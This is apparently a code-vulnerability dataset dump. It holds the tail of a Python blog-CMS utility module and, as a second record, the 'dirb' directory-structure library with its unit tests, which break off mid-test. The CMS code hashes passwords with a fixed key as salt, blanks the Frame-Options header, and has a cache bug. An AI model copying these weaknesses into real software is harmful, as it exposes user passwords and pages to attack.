    def _include(self, env, _name=None, **kwargs):
        from core.models import Template
        template_to_import = Template.get(
            Template.blog == self._tags.get('blog', None),
            Template.title == _name)
        tpl = MetalTemplate(template_to_import.body, tags=self._tags)
        self.includes.append(_name)
        return tpl.execute(env['_stdout'], env)
    def render(self, *args, **kwargs):
        return super(MetalTemplate, self).render(*args, **kwargs)

def tpl(*args, **ka):
    '''
    Shim for the template function to force it to use a string that might be
    ambiguously a filename.
    '''
    # TODO: debug handler for errors in submitted user templates here?
    tp = MetalTemplate('\n' + args[0], tags=ka)
    x = tp.render(ka)
    return x[1:]

tp_cache = {}

def tpl2(template, **ka):
    try:
        template_to_render = tp_cache[template.blog.id][template.id]
    except KeyError:
        template_to_render = MetalTemplate('\n' + template.body, tags=ka)
        tp_cache[template.blog.id][template.id] = template_to_render
    x = template_to_render.render(ka)
    return x[1:]


def generate_paginator(obj, request, items_per_page=ITEMS_PER_PAGE):

    '''
    Generates a paginator block for browsing lists, for instance in the blog or site view.
    '''
    page_num = page_list_id(request)

    paginator = {}

    paginator['page_count'] = obj.count()

    paginator['max_pages'] = int((paginator['page_count'] / items_per_page) + (paginator['page_count'] % items_per_page > 0))

    if page_num > paginator['max_pages']:
        page_num = paginator['max_pages']

    paginator['next_page'] = (page_num + 1) if page_num < paginator['max_pages'] else paginator['max_pages']
    paginator['prev_page'] = (page_num - 1) if page_num > 1 else 1

    paginator['first_item'] = (page_num * items_per_page) - (items_per_page - 1)
    paginator['last_item'] = paginator['page_count'] if (page_num * items_per_page) > paginator['page_count'] else (page_num * items_per_page)

    paginator['page_num'] = page_num
    paginator['items_per_page'] = items_per_page

    obj_list = obj.paginate(page_num, ITEMS_PER_PAGE)

    return paginator, obj_list



def generate_date_mapping(date_value, tags, path_string):
    '''
    Generates a date mapping string, usually from a template mapping,
    using a date value, a tag set, and the supplied path string.
    This is often used for resolving template mappings.
    The tag set is contextual -- e.g., for a blog or a site.
    '''

    time_string = date_value.strftime(path_string)
    path_string = tpl(time_string, **tags.__dict__)

    return path_string

def postpone(function):
    '''
    Thread launcher function
    '''
    def decorator(*args, **ka):
        t = Thread(target=function, args=args, kwargs=ka)
        t.daemon = True
        t.start()

    return decorator


def encrypt_password(password, key=None):

    if key is None:
        p_key = PASSWORD_KEY
    else:
        p_key = key

    bin_password = password.encode('utf-8')
    bin_salt = p_key.encode('utf-8')

    m = hashlib.sha256()
    for n in range(1, 1000):
        m.update(bin_password + bin_salt)
    m = m.digest()
    encrypted_password = base64.b64encode(m)

    return encrypted_password

def memoize(f):
    '''
    Memoization decorator for a function taking one or more arguments.
    '''
    # pinched from http://code.activestate.com/recipes/578231-probably-the-fastest-memoization-decorator-in-the-/
    class memodict(dict):
        def __getitem__(self, *key):
            return dict.__getitem__(self, key)

        def __missing__(self, key):
            ret = self[key] = f(*key)
            return ret

    return memodict().__getitem__

def memoize_delete(obj, item):
    obj.__self__.__delitem__(item)

def _iter(item):
    try:
        (x for x in item)
    except BaseException:
        return (item,)
    else:
        return item


def page_list_id(request):

    if not request.query.page:
        return 1
    try:
        page = int(request.query.page)
    except ValueError:
        return 1
    return page


def raise_request_limit():
    from core.libs import bottle
    import settings
    bottle.BaseRequest.MEMFILE_MAX = settings.MAX_REQUEST

def disable_protection():
    response.set_header('Frame-Options', '')
    # response.set_header('Content-Security-Policy', '')

def action_button(label, url):
    action = ""<a href='{}'><button type='button' class='btn btn-sm'>{}</button></a>"".format(
        url,
        label
        )

    return action
/n/n/n",1
150,10e70875b059602c3117cc40a75a980b5e88edc5,"dirb/ds.py/n/n#####################################################################
#
# Copyright 2015 Mayur Patel
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License. 
# 
#####################################################################

from . import pathexpr
from . import attrexpr
from . import ugoexpr

from . import fs

import copy
import collections
import itertools
import os
import glob



# A directory structure object:
#
# (1) has a schema,
# A set of rules which outline the tree-structure for the file system.
# One rule must be called ""ROOT"", but traversal can begin from anywhere
# and from any rule.
#
# (3) has collections, which connect with metadata
# It is handy to use collections as part of the directory structure,
# for example, to be able to use a departments list as a parameter
# for work area or publish area builds.
#
# (2) has globals, which are attributes that do not vary per-location.
#
#
# A directory location 
#   has an optional bookmark definition, which implicitly a parameterization by which the bookmark can be found.
#       in some ways, an bookmark is really just a special attribute tag.  
#       A bookmark can appear in different places, meaning that it can have multiple parameterizations
#       a bookmark is not inherited
#   has attributes, which can either be inherited down or not. (treeattribute, localattribute)
#   might be parameterized or not. a parameter is either unrestricted or restricted to a selection from a collection and
#   has a default owner and permissions.  The owner could be parameterized.
#
# Directory locations are stacked into rules as much as possible:
#   reduces the complexity of many kinds of structure schemas
#   allows optimizations to be placed strategically.
#   allows us to keep most of the directory structure as an explicit map/list,
#      converting on the absolutely bare essentials into additional complexity.
#
# Directory structure is meant to be flexible but not DYNAMIC!
#      You might want to change it a couple times a year, but not every day
#
# Need to resolve ambiguous paths by being strict with search order.
#     ""fixed"" directories should be listed first, in the reference list.
#     parameterized directories should be listed last (and ideally, there's only one!)
#




# before being compiled:
""""""

{
  
  'collections' : {
    },
    
  'globals' : {},
  
  'rules' : {
  
    'ROOT' : [
        ['multiple', { 
            'key' : 'department'
            'bookmarks' : ['workarea'],
            'localattributes' : {},
            'treeattributes' : {},
            'user' : '(parameter user)',
            'group' : 'vfx',
            'permissions' : 'rwxr-xr-x' 
         }],
        
        ['directory', {
           'name' : 'value'
         }]
      
      ],
    
    'alternative' : [
      ],
    
    'rule2' : [
      ]
    }
}

""""""

""""""
a rule is a list of directory levels.
a compiled rule has:
   a set of bookmarks under it
   a set of parameters under it
   a set of attributes under it

Directory level types:
  fixed : one or more fixed names, not parameterized
     fields : bookmarks, local attrs, tree attrs, name, user, group, permissions
  branch : redirects to one or more other rules, IN ORDER, no special attributes of its own
     fields: rules
  parameterized : any number of parameterized directories, there is one key and potentially many values.
     fields : bookmarks, local attrs, tree attrs, key, collection, user group, permissions
     if there is an collection attribute, then the values are restricted.
  regex : can represent zero or more parameters, as defined by the groups in the expression.  Also good when
     there is a prefix or suffix or restrictions on the character set.
     fields: bookmarks, local attrs, tree attrs, pattern, collections, user, group, permissions
     regex is TODO
""""""

FnLevel = {} # use of a singleton impairs ability to run multi-threaded, locks should be placed inside the level methods that need them.

# we use a class decorator here, instead of metaclasses for example,
# because what we really want is a dictionary of class instances (singletons actually),
# not some dictionary of classes, or other kind of class manipulation.
def register_level( cls ) :
  FnLevel[cls.__name__] = cls()
  return cls


class BaseLevel(object):
  def __init__(self):
    pass
  
  def validate( self, levelfields, path_list, client ): # for use during compile (?)
    return True
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client ):
    return []
  
  def get_bookmarks( self, levelfields, doc ): # used during compile
    return set(levelfields['bookmarks'] if 'bookmarks' in levelfields else [])
  
  def get_attributes( self, levelfields, doc ): # used during compile
    keys = levelfields['localattributes'].keys() if 'localattributes' in levelfields else []
    keys.extend( levelfields['treeattributes'].keys() if 'treeattributes' in levelfields else [] )
    return set( keys )
    
  def get_parameters( self, levelfields, doc ): # used during compile
    return set([levelfields['key']] if 'key' in levelfields else [])



@register_level
class FixedLevel(BaseLevel) :
  def __init__(self):
    BaseLevel.__init__(self) # can't use super() because we instance the class before definition is complete!
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client ):
    candidates = [(x, os.path.join(x.path, levelfields['name'])) for x in ctxlist]
    if searcher.do_existing_paths() :
      candidates = [(x, y) for x, y in candidates if os.path.isdir(y)]
    return candidates
    
  def get_parameters( self, levelfields, doc ): # used during compile
    return set()
  
@register_level
class BranchLevel(BaseLevel) :
  def __init__(self):
   BaseLevel.__init__(self) # can't use super() because we instance the class before definition is complete!
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client):
    rulenames = levelfields['rules']
    for rulename, ctx in itertools.product( rulenames, ctxlist ) :
      rule = client.get_rule( rulename )
      _traverse( searcher, rule, ctx, client ) # indirect recursion
    return None
  
  def get_bookmarks( self, levelfields, doc ):
    bookmarks = set()
    rulenames = levelfields['rules']
    for rulename in rulenames :
      rule = doc['rules'][ rulename ]
      bookmarks |= get_rule_bookmarks(rule,doc)
    return bookmarks
  
  def get_attributes( self, levelfields, doc ):
    attributes = set()
    rulenames = levelfields['rules']
    for rulename in rulenames :
      rule = doc['rules'][ rulename ]
      attributes |= get_rule_attributes(rule,doc)
    return attributes
    
  def get_parameters( self, levelfields, doc ):
    parameters = set()
    rulenames = levelfields['rules']
    for rulename in rulenames :
      rule = doc['rules'][ rulename ]
      parameters |= get_rule_parameters(rule,doc)
    return parameters



@register_level
class ParameterizedLevel(BaseLevel) :
  def __init__(self):
    BaseLevel.__init__(self) # can't use super() because we instance the class before definition is complete!
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client ):
    doexisting = searcher.do_existing_paths()
    dirlist = []
    
    if doexisting :
      
      for ictx in ctxlist:
        ctxdirs = glob.glob( os.path.join( ictx.path, '*' ))
        ctxdirs = ( x for x in ctxdirs if os.path.isdir( x ))
        
        if 'collection' in levelfields:
          coll = client.get_collection( levelfields['collection'] )
          ctxdirs = ( x for x in ctxdirs if os.path.split(x)[-1] in coll )
          
        dirlist.extend( (ictx, x) for x in ctxdirs )
      
    else:
      
      values = []
      if 'key' in levelfields:
        search_param = searcher.get_parameters(levelfields['key'], levelctx, ctxlist)
        if search_param:
          values.extend( x for x in search_param if x ) # eliminate None values
          
      if 'collection' in levelfields:
        coll = client.get_collection( levelfields['collection'] )
        bad_values = [x for x in values if x not in coll]
        if bad_values:
          raise KeyError( ""Collection '%s' does not contain %s"" % (levelfields['collection'], ','.join(""'%s'"" % x for x in bad_values)))
      
      for ctx, value in itertools.product( ctxlist, values ):
        dirlist.append((ctx, os.path.join( ctx.path, value )))
          
    return dirlist 
  
# -----------

def get_rule_bookmarks( levellist, doc ) : # used during compile
  ret = set()
  for level in levellist:
    leveltype = level[0]
    levelfields = level[1]
    ret |= FnLevel[leveltype].get_bookmarks( levelfields, doc)
  return ret
  
def get_rule_attributes( levellist, doc ): # used during compile
  ret = set()
  for level in levellist:
    leveltype = level[0]
    levelfields = level[1]
    ret |= FnLevel[leveltype].get_attributes( levelfields, doc)
  return ret

def get_rule_parameters( levellist, doc ): # used during compile
  ret = set()
  for level in levellist:
    leveltype = level[0]
    levelfields = level[1]
    ret |= FnLevel[leveltype].get_parameters( levelfields, doc)
  return ret  




RuleTraversalContext = collections.namedtuple( ""RuleTraversalContext"", (""bookmarks"", ""attributes"", ""parameters"")) # elements of levels contained
PathTraversalContext = collections.namedtuple( ""PathTraversalContext"", ( ""bookmarks"", ""attributes"", ""parameters"", ""path"", ""collections"", ""user"", ""group"", ""permissions"") ) # includes attrs and params from current level
LevelTraversalContext = collections.namedtuple( ""LevelTraversalContext"", ( ""bookmarks"", ""treeattributes"", ""localattributes"", ""parameter"", ""collection"", ""user"", ""group"", ""permissions"" )) # elements of current level only



def _traverse( searcher, rule, ctx, client ):
  if searcher.does_intersect_rule( RuleTraversalContext( rule['bookmarks'], rule['attributes'], rule['parameters'] ) ):
    
    pathlist = [ctx]
    for leveltype, levelfields in rule[ 'levels' ]:
      
      # create new level context:
      levelbookmarks = levelfields['bookmarks'] if 'bookmarks' in levelfields else []
      leveltreeattr = levelfields['treeattributes'] if 'treeattributes' in levelfields else {}
      levellocalattr = levelfields['localattributes'] if 'localattributes' in levelfields else {}
      levelparameter = levelfields['key'] if 'key' in levelfields else None
      levelcollection = levelfields['collection'] if 'collection' in levelfields else None
      leveluser = levelfields['user'] if 'user' in levelfields else None
      levelgroup = levelfields['group'] if 'group' in levelfields else None
      levelpermissions = levelfields['permissions'] if 'permissions' in levelfields else None
      
      levelctx = LevelTraversalContext( levelbookmarks, leveltreeattr, levellocalattr, levelparameter, levelcollection, leveluser, levelgroup, levelpermissions )
      
      # get directories for this level
      ruletuples = FnLevel[ leveltype ].get_directories( levelctx, levelfields, searcher, pathlist, client )
      
      if not ruletuples:
        break # end for
      
      passedlist = []
      for ictx, dirname in ruletuples: # breadth-first search with pruning

        treeattr = ictx.attributes.copy() # shallow
        if 'treeattributes' in levelfields:
          treeattr.update( leveltreeattr )
          
        localattr = treeattr.copy() # shallow
        if 'localattributes' in levelfields:
          localattr.update( levellocalattr )
          
        parameters = ictx.parameters.copy() # shallow
        collections = ictx.collections.copy() # shallow
        if levelparameter :
          basename = os.path.basename( dirname )
          parameters[ levelparameter ] = basename
          if levelcollection:
            collections[ levelparameter ] = levelcollection
            
        user = attrexpr.eval_attribute_expr( leveluser, localattr, parameters ) if leveluser else ictx.user
        group = attrexpr.eval_attribute_expr( levelgroup, localattr, parameters ) if levelgroup else ictx.group
        permissions = ugoexpr.eval_ugo_expr( levelpermissions ) if levelpermissions else ictx.permissions
        
        newctx = PathTraversalContext( levelbookmarks, localattr, parameters, dirname, collections, user, group, permissions )
        test = searcher.does_intersect_path( newctx )
        if test:
          searcher.test( newctx, levelctx )
          newctx = PathTraversalContext( levelbookmarks, treeattr, parameters, dirname, collections, user, group, permissions ) # context that the children see & modify
          passedlist.append( newctx )
        
      pathlist = passedlist

  return

  
""""""
a rule is a list of directory levels.
a compiled rule has:
   a set of bookmarks under it
   a set of parameters under it
   a set of attributes under it

Directory level types:
  fixed : one or more fixed names, not parameterized
     fields : bookmarks, local attrs, tree attrs, name
  branch : redirects to one or more other rules, IN ORDER, no special attributes of its own
     fields: rules
  parameterized : any number of parameterized directories, there is one key and potentially many values.
     fields : bookmarks, local attrs, tree attrs, key, collection,
     if there is an collection attribute, then the values are restricted.
     """"""

def compile_dir_structure( doc ):
    ""returns a compiled version of the input document""
    ret ={ 'globals': {}, 'collections':{}, 'rules':{} }
    # copy globals:
    if 'globals' in doc:
      ret['globals'] = copy.deepcopy( doc['globals'] )
    # copy collections:
    if 'collections' in doc:
      ret['collections'] = copy.deepcopy( doc['collections'] )
    # copy rules:
    if 'rules' in doc:
      # a document rule is a key-value pair
      #    name of the rule is the key
      #    list of levels is the value.
      for rulename in doc['rules']:
        levellist = doc['rules'][rulename]
        ret['rules'][rulename] = {
          'levels' : copy.deepcopy( levellist ),
          'bookmarks' : tuple(get_rule_bookmarks(levellist, doc)),
          'parameters' : tuple(get_rule_parameters(levellist, doc)),
          'attributes' : tuple(get_rule_attributes(levellist, doc))
          }
    return ret

# -----------
/n/n/ndirb/localclient.py/n/n#####################################################################
#
# Copyright 2015 Mayur Patel
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License. 
# 
#####################################################################

from . import pathexpr
from . import ds
from . import fs

# a compiledrule is a dictionary with fields:
#    ""bookmarks"": set of bookmarks (under it)
#    ""parameters"" : set of parameters (keys only) (under it) 
#    ""attributes"" : set of attributes (keys only) (under it)
#    ""levels"" : tuples of tuples, (( ""leveltype"", {<levelfields>}),( ""leveltype"", {<levelfields>}),etc)
#    as traversal occurs, the bookmarks, parameter, attributes move from rules to the contexts as they resolve.
#

#
# A searcher has :
# does_intersect_rule( self, rulectx ) return bool if the rule might contain our target
# does_intersect_path( self, pathctx ) returns bool if the path might contain our target
# test( self, pathctx, levelctx ) to detemine whether this level is our target
# do_existing_paths() : bool, are we traversing real directories on disk, or is this theoretical?
# get_parameters( self, key, levelctx, pathctxlist ) : if this is a theoretical traversal, then the searcher needs to supply possible values, for each parameter key, to advance the search.


  

class LocalClient( object ) :
  def __init__(self, compileddoc, startingpath ):
    self._doc = compileddoc
    self._root = startingpath

  def get_rule_names( self ):
    return self._doc['rules'].keys()
  
  def get_rule( self, rulename ): # advanced API, not necessarily public; returns compiled rule
    return self._doc['rules'][rulename] if rulename in self._doc['rules'] else None
  
  def get_collection_names( self ):
    return self._doc['collections'].keys()
  
  def get_collection( self, collectionname ) : 
    return self._doc['collections'][collectionname] if collectionname in self._doc['collections'] else None
  
  def get_global_names( self ):
    return self._doc['globals'].keys()
  
  def get_global( self, attrname ):
    return self._doc['globals'][attrname] if attrname in self._doc['globals'] else None

  def traverse( self, searcher ): # advanced API, not necessarily public
    ctx = ds.PathTraversalContext( [], {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    client = self
    return ds._traverse( searcher, rule, ctx, client )
  
  def get_bookmark_names( self ) :
    return self._doc['rules']['ROOT']['bookmarks']
  
  def get_bookmark_parameters( self, bookmark ):
    """"""returns the parameters required to find the bookmark.  A list of dictionaries.  Each dictionary is a set of parameters required to find the bookmark.  The key is the parameter name and the value determines which, if any, collection the parameter is associated with.""""""
    class SearcherBookmarks( object ):
      def __init__( self, dirstructure ) :
        self._store = []
        self._ds = dirstructure
      def does_intersect_rule( self, rulectx ):
        return bookmark in rulectx.bookmarks
      def does_intersect_path( self, pathctx ):
        return True
      def test( self, pathctx, levelctx ):
        if bookmark in levelctx.bookmarks:
          found = ( (x,None) if x not in pathctx.collections else (x,pathctx.collections[x]) for x in pathctx.parameters.keys() )
          self._store.append( dict(found) )
      def do_existing_paths( self ) :
        return False
      def get_parameters( self, key, levelctx, pathctxlist ):
        if levelctx.collection:
          coll = self._ds.get_collection( levelctx.collection )
          return (coll[0],)
        else:
          return ('X',)
    searcher = SearcherBookmarks( self )
    ctx = ds.PathTraversalContext( [], {}, {}, '', {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store
  
  def search_paths( self, searchexpr ):
    """"""implies a query, with a specific predicate or filter to narrow the search, returns only paths that exist""""""
    searcher = pathexpr.SearcherExists( self, searchexpr )
    ctx = ds.PathTraversalContext( [], {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store
  
  def depict_paths( self, createexpr ):
    ""this returns a not-exists path, but does not make a directory on disk""
    searcher = pathexpr.SearcherNotExists( self, createexpr )
    ctx = ds.PathTraversalContext( [], {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store
  
  def get_path_context( self, targetpath ):
    ""returns the path traversal context for the given path, works for real paths or depicted paths, will reject invalid paths, will accept paths deeper than what the structure knows about giving the deepest context it can""
    class SearcherPath( object ):
      def __init__( self, targetpath, client ) :
        self._splitpath = fs.split_path( targetpath )
        self._lensplitpath = len( self._splitpath )
        self._store = {} # this keeps matches, indexed by their depths
        self._ds = client
      def does_intersect_rule( self, rulectx ):
        return True
      def does_intersect_path( self, pathctx ):
        testpath = fs.split_path( pathctx.path )
        lentestpath = len(testpath)
        lenpath = min( self._lensplitpath, lentestpath )
        does_pass = self._splitpath[:lenpath] == testpath and lentestpath <= self._lensplitpath
        if does_pass and lentestpath not in self._store :
          # when we reach a new depth, we create a new entry in our storage
          self._store[lentestpath] = []
        return does_pass
      def test( self, pathctx, levelctx ):
        testpath = fs.split_path( pathctx.path )
        lenpath = min( self._lensplitpath, len(testpath))
        if self._splitpath[:lenpath] == testpath[:lenpath] :
          # store hits at the depth they occur:
          self._store[lenpath].append( pathctx )
      def do_existing_paths( self ) :
        return False
      def get_parameters( self, key, levelctx, pathctxlist ):
        # we get parameters from the path itself
        ret = set()
        for pathctx in pathctxlist :
          testpath = fs.split_path( pathctx.path )
          lenpath = len(testpath)
          if self._lensplitpath > lenpath:
            ret.add( self._splitpath[lenpath] )
        return ret
      
    searcher = SearcherPath( targetpath, self )
    ctx = ds.PathTraversalContext( [], {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )
    ret = ctx if targetpath == self._root else None
    if searcher._store :
      # all depths in the traversal needed to have a match, otherwise the path was not valid for the directory structure:
      if all( searcher._store[i] for i in searcher._store ):
        # we want to return the deepest match:
        key = max( searcher._store.keys() )
        assert 1 == len(searcher._store[key]), ""Multiple targets found for single path (%s)"" % targetpath
        ret = searcher._store[key][0]
    return ret

  def get_frontier_contexts( self, targetpath ):
    """"""given an existing path, returns the 'next' parameter to be defined, as well as the paths to which that parameter leads.
    necessary for UI development.
    returns a dictionary where the key is the parameter name, and the value is the list of directories associated with that parameter
    
    """"""
    """"""
    
    implementation details:
    set of parameters:
    calculate extra parameters
    calculate missing parameters
    if there are missing parameters, then cull the search
    if there is one extra parameter, then add it to the hits
    if there is zero extra parameters, then continue
    if there is more than one extra parameters, then cull the search
    
    """"""
    class SearcherPath( object ):
      def __init__( self, targetctx, client ) :
        self._splitpath = fs.split_path( targetctx.path )
        self._targetparam = set( targetctx.parameters.keys() )
        self._lensplitpath = len( self._splitpath )
        self._store = {}
        self._ds = client
      def does_intersect_rule( self, rulectx ):
        return True
      def does_intersect_path( self, pathctx ):
        testpath = fs.split_path( pathctx.path )
        lentestpath = len(testpath)
        lenpath = min( self._lensplitpath, lentestpath )
        extra_count = len( set( pathctx.parameters.keys() ) - self._targetparam )
        return self._splitpath[:lenpath] == testpath[:lenpath] and extra_count < 2
      def test( self, pathctx, levelctx ):
        path_set = set( pathctx.parameters.keys() )
        extra_param = path_set - self._targetparam
        extra_count = len( extra_param )
        missing_count = len( self._targetparam - path_set )
        testpath = fs.split_path( pathctx.path )
        lenpath = min( self._lensplitpath, len(testpath))
        if extra_count == 1 and ( not missing_count ) and levelctx.parameter:
          key = extra_param.pop()
          if not key in self._store:
            self._store[key] = []
          self._store[key].append( pathctx )
      def do_existing_paths( self ) :
        return True
      def get_parameters( self, key, levelctx, pathctxlist ):
        return None

    targetctx = self.get_path_context( targetpath )
    searcher = SearcherPath( targetctx, self )
    ctx = ds.PathTraversalContext( [], {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store

      /n/n/ntest.py/n/n#!/usr/bin/env python2.7

#####################################################################
#
# Copyright 2015 Mayur Patel
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License. 
# 
#####################################################################

import dirb.ds as ds
import dirb.localclient as localclient
import dirb.sexpr as sexpr
import dirb.pathexpr as pathexpr

import unittest
import os

# ==========================================
class SimpleSexprTest(unittest.TestCase):
  # ----------------------------------------
  def test_identity( self ):
    e = ""( and  (bookmark alpha) (parameter (key value) (key value) (key value)) )""
    self.assertEqual( sexpr.loads( e ), sexpr.loads(sexpr.dumps( sexpr.loads( e )))  )
    self.assertEqual( sexpr.loads( e ), ['and', ['bookmark', 'alpha'], ['parameter', ['key','value'], ['key','value'],['key','value']]]  )

  def test_escape_bracket( self ):
    e = r'(""(name)"" in bracket)'
    self.assertEqual( sexpr.loads( e ), ['(name)', 'in', 'bracket'] )
    
  def test_bracket( self ):
    e = r'(\(name\) in bracket)'
    self.assertEqual( sexpr.loads( e ), ['\\', ['name\\'], 'in', 'bracket'] )
  
  def test_quote( self ):
    e = '(""(name) (value)\""\"""" token2)'
    self.assertEqual( sexpr.loads( e ), ['(name) (value)\""\""', 'token2'] )
          
# ==========================================
# /<show>/sequence/<sequence>/<shot>/<dept>
# /<show>/asset/<assettype>/<asset>/<dept>
class SimpleLocalClientTest(unittest.TestCase):

  def setUp(self):
    self.dirlist = (
      '/tmp/dirbtest1/projects/',
      '/tmp/dirbtest1/projects/show',
      '/tmp/dirbtest1/projects/show/asset',
      '/tmp/dirbtest1/projects/show/asset/vehicle',
      '/tmp/dirbtest1/projects/show/asset/vehicle/car1',
      '/tmp/dirbtest1/projects/show/asset/vehicle/car1/lighting',
      '/tmp/dirbtest1/projects/show/sequence',
      '/tmp/dirbtest1/projects/show/sequence/aa',
      '/tmp/dirbtest1/projects/show/sequence/aa/xx',
      '/tmp/dirbtest1/projects/show/sequence/bb',
      '/tmp/dirbtest1/projects/show/sequence/bb/xx',
      '/tmp/dirbtest1/projects/show/sequence/bb/xx/animation',
      '/tmp/dirbtest1/projects/show/sequence/bb/xx/lighting',
      '/tmp/dirbtest1/projects/show/sequence/bb/yy',
      '/tmp/dirbtest1/projects/show/sequence/bb/zz',
      '/tmp/dirbtest1/projects/show/sequence/cc'
      )
    self.doc = ds.compile_dir_structure( { 
      'collections' : {""department"":[""animation"",""lighting""], ""app"":['katana','maya']},
      'rules' : {
          
        'ROOT' : [
                ['ParameterizedLevel', { ""bookmarks"":[""showroot""], ""key"":'show'}],
                ['BranchLevel', {""rules"":[""sequence"",""asset""]}],
            ],
          
          
        'sequence' :[
                ['FixedLevel', {""name"":'sequence'}],
                ['ParameterizedLevel', { ""key"":'sequence'}],
                ['ParameterizedLevel', { ""key"":'shot', ""bookmarks"":['shotroot']}],
                ['ParameterizedLevel', { ""key"":'dept', ""collection"":""department"", 'bookmarks':['workarea']}]
            ],
          
          
        'asset' : [
                ['FixedLevel', {""name"":'asset'}],
                ['ParameterizedLevel', { ""key"":'assettype'}],
                ['ParameterizedLevel', { ""key"":'asset', 'bookmarks':['assetroot']}],
                ['ParameterizedLevel', { ""key"":'dept', ""collection"":""department"", 'bookmarks':['workarea']}]
            ]
        }
    } )
    self.d = localclient.LocalClient( self.doc, ""/tmp/dirbtest1/projects"" )
    for d in self.dirlist:
      if not os.path.isdir( d ):
        os.makedirs( d )

  # ----------------------------------------
  def test_simple_search(self):
    class ShotSearcher( object ) :
      def __init__( self ) :
        self.hold = []
      
      def does_intersect_rule( self, rulectx ):
        return 'shotroot' in rulectx.bookmarks
      
      def does_intersect_path( self, pathctx ):
        return True
      
      def test( self, pathctx, levelctx ):
        ret = 'shotroot' in levelctx.bookmarks
        if ret :
          self.hold.append( pathctx.path )
        return ret
            
      def do_existing_paths( self ):
        return False
    
      def get_parameters( self, key, levelctx, pathctxlist ) :
        if key == ""sequence"" :
          return (""SEQUENCE"",)
        if key == ""shot"" :
          return (""SHOT"",)
        if key == ""show"" :
          return (""SHOW"",)
        if key == 'dept':
          return ( ""animation"",""lighting"" )
        return []
      
    s = ShotSearcher()
    self.d.traverse( s )
    self.assertEqual(s.hold, ['/tmp/dirbtest1/projects/SHOW/sequence/SEQUENCE/SHOT'])
    
  # ----------------------------------------
  def test_bookmark_names(self):
    bookmarks = set( self.d.get_bookmark_names() )
    expected = set(('showroot','shotroot','assetroot','workarea'))
    self.assertEqual(bookmarks, expected)

  # ----------------------------------------
  def test_bookmark_parameters(self):
    found = self.d.get_bookmark_parameters('workarea')
    found = sorted( [ sorted(x.items()) for x in found ] )
    expected = [{'dept': 'department', 'show': None, 'shot': None, 'sequence': None}, {'dept': 'department', 'show': None, 'asset': None, 'assettype': None}]
    expected = sorted( [ sorted( x.items() ) for x in expected ] )
    self.assertEqual(found, expected)
    
  # ----------------------------------------
  def test_search_paths_and(self):
    searchexpr = '(and (bookmark shotroot) (parameters (show show)(shot xx)(sequence bb)))'
    foundlist = self.d.search_paths( searchexpr )
    self.assertEqual( len(foundlist), 1 )
    pathctx = foundlist[0]
    self.assertEqual( pathctx.path, '/tmp/dirbtest1/projects/show/sequence/bb/xx' )
    self.assertEqual( pathctx.parameters, {'show': 'show', 'shot': 'xx', 'sequence': 'bb'} )
    self.assertEqual( pathctx.bookmarks, ['shotroot'] )
    
  # ----------------------------------------
  def test_search_paths_multifinder_parameters(self):
    searchexpr = '(parameters (show show)(shot xx)(sequence bb))'
    foundlist = self.d.search_paths( searchexpr )
    foundlist = set( x.path for x in foundlist )
    expected = set((
      '/tmp/dirbtest1/projects/show/sequence/bb/xx/animation', 
      '/tmp/dirbtest1/projects/show/sequence/bb/xx/lighting', 
      '/tmp/dirbtest1/projects/show/sequence/bb/xx', 
      '/tmp/dirbtest1/projects/show/sequence/bb', 
      '/tmp/dirbtest1/projects/show/sequence', 
      '/tmp/dirbtest1/projects/show' ))
    self.assertEqual( foundlist, expected )

  # ----------------------------------------
  def test_search_paths_andor(self):
    searchexpr = '(and (bookmark workarea) (or (parameters (sequence bb))(parameters (asset car1))))'
    foundlist = self.d.search_paths( searchexpr )
    foundlist = set( x.path for x in foundlist )
    expected = set((
      '/tmp/dirbtest1/projects/show/asset/vehicle/car1/lighting',
      '/tmp/dirbtest1/projects/show/sequence/bb/xx/animation',
      '/tmp/dirbtest1/projects/show/sequence/bb/xx/lighting'))
    self.assertEqual( foundlist, expected )
  
  # ----------------------------------------
  def test_search_paths_multifinder_bookmarks(self):
    searchexpr = '(bookmark shotroot)'
    foundlist = self.d.search_paths( searchexpr )
    foundlist = set( x.path for x in foundlist )
    expected = set((
      '/tmp/dirbtest1/projects/show/sequence/aa/xx',
      '/tmp/dirbtest1/projects/show/sequence/bb/xx',
      '/tmp/dirbtest1/projects/show/sequence/bb/yy',
      '/tmp/dirbtest1/projects/show/sequence/bb/zz'))
    self.assertEqual( foundlist, expected )
    
  # ----------------------------------------
  def test_parameter_collect_parameter(self):
